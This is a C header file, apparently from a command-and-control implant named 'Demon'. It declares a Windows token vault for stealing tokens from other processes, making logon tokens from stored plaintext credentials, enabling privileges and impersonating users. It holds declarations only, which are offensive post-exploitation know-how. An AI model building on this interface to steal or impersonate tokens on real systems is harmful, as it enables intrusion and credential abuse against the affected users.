#ifndef DEMON_TOKEN_H
#define DEMON_TOKEN_H

#include <windows.h>

#define TOKEN_TYPE_STOLEN       0x1
#define TOKEN_TYPE_MAKE_NETWORK 0x2

typedef struct _TOKEN_LIST_DATA
{
    HANDLE  Handle;
    PCHAR   DomainUser;
    DWORD   dwProcessID;
    SHORT   Type;

    // Make data
    LPSTR   lpUser;
    LPSTR   lpPassword;
    LPSTR   lpDomain;

    struct _TOKEN_LIST_DATA* NextToken;
} TOKEN_LIST_DATA, *PTOKEN_LIST_DATA ;

// Utils
HANDLE           TokenCurrentHandle( );
BOOL             TokenSetPrivilege( LPSTR Privilege, BOOL Enable );

// Token Vault
DWORD            TokenAdd( HANDLE hToken, LPSTR DomainUser, SHORT Type, DWORD dwProcessID, LPSTR User, LPSTR Domain, LPSTR Password );
BOOL             TokenRemove( DWORD TokenID );
HANDLE           TokenSteal( DWORD dwTargetPID );
HANDLE           TokenMake( LPSTR User, LPSTR Password, LPSTR Domain );
PTOKEN_LIST_DATA TokenGet( DWORD TokenID );
VOID             TokenClear( );
VOID             TokenImpersonate( BOOL Impersonate );

#endif
